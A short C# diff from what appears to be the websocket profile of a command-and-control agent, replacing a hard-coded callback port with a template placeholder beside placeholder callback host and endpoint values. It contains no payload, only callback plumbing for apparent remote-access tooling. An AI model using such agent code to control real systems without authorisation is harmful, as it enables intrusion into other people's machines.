@@ -31,7 +31,7 @@ namespace Agent.Profiles.Websocket
             this.crypt = crypto;
             this.logger = logger;
             this.messageManager = messageManager;
-            int callbackPort = Int32.Parse("8081");
+            int callbackPort = Int32.Parse("callback_port");
             string callbackHost = "callback_host";
             this.endpoint = "ENDPOINT_REPLACE";
             this.url = $"{callbackHost}:{callbackPort}/{this.endpoint}";
